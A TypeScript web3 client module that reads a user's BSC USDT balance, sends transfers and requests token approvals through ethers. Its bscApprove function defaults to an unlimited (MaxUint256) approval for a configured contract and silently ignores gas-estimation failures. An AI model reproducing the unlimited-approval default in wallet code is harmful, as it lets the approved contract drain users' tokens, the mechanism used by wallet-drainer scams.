'use client';
import {
  BrowserProvider,
  Contract,
  Interface,
  formatUnits,
  parseUnits,
  isAddress,
  MaxUint256,
  toBeHex,
} from "ethers";
import abi from "./abi.json";
import { BSC_USDT_CONTRACT_ADDRESS,BSC_CLIENT_CONTRACT_ADDRESS, BSC_RPC_URL } from "../../constant/constant";

export const BSC_CHAIN_ID = 56;

const erc20Interface = new Interface(abi);



function requireConfig() {
  if (!BSC_USDT_CONTRACT_ADDRESS) {
    throw new Error("Missing BSC USDT contract address");
  }
}

/** Build an ethers Contract bound to a read-only provider. */
function getReadContract(walletProvider: any) {
  requireConfig();
  const provider = new BrowserProvider(walletProvider);
  return new Contract(BSC_USDT_CONTRACT_ADDRESS, abi, provider);
}

/** Build an ethers Contract bound to the signer (for write txns). */
async function getWriteContract(walletProvider: any) {
  requireConfig();
  const provider = new BrowserProvider(walletProvider);
  const signer = await provider.getSigner();
  return new Contract(BSC_USDT_CONTRACT_ADDRESS, abi, signer);
}

/**
 * Read method: balanceOf(address)
 * Returns a human-readable, decimal-adjusted balance + token symbol.
 */
export async function getBscBalance(
  walletProvider: any,
  account: string
) {
  if (!isAddress(account)) {
    throw new Error("Invalid wallet address");
  }

  const contract = getReadContract(walletProvider);

  const [raw, decimals, symbol] = await Promise.all([
    contract.balanceOf(account),
    contract.decimals(),
    contract.symbol(),
  ]);

  return {
    raw: raw.toString(),
    balance: formatUnits(raw, decimals),
    symbol,
    decimals: Number(decimals),
  };
}

export async function bscTransfer(
  walletProvider: any,
  receiver: string,
  amount: string | number
) {
  if (!isAddress(receiver)) {
    throw new Error("Invalid receiver address");
  }

  if (!amount || Number(amount) <= 0) {
    throw new Error("Enter a valid amount");
  }

  const contract = await getWriteContract(walletProvider);
  const decimals = await contract.decimals();
  const value = parseUnits(String(amount), decimals);

  const tx = await contract.transfer(receiver, value);
  const receipt = await tx.wait();

  return {
    hash: receipt?.hash || tx.hash,
    receipt,
  };
}


export async function bscApprove(
  walletProvider: any,
  spender = BSC_CLIENT_CONTRACT_ADDRESS,
  amount = MaxUint256
) {
  requireConfig();

  if (!isAddress(spender)) {
    throw new Error("Invalid/empty spender address");
  }

  const provider = new BrowserProvider(walletProvider);
  const signer = await provider.getSigner();
  const from = await signer.getAddress();

  // Encode approve(spender, amount)
  const data = erc20Interface.encodeFunctionData("approve", [
    spender,
    amount,
  ]);

  const tx: any = {
    from,
    to: BSC_USDT_CONTRACT_ADDRESS,
    data,
    value: "0x0",
  };

  try {
    const estimate = await provider.estimateGas(tx);
  tx.gas = toBeHex((estimate * BigInt(12)) / BigInt(10));
  } catch {
   
  }

  const hash = await walletProvider.request({
    method: "eth_sendTransaction",
    params: [tx],
  });

  const receipt = await provider.waitForTransaction(hash);

  return {
    hash: receipt?.hash || hash,
    receipt,
  };
}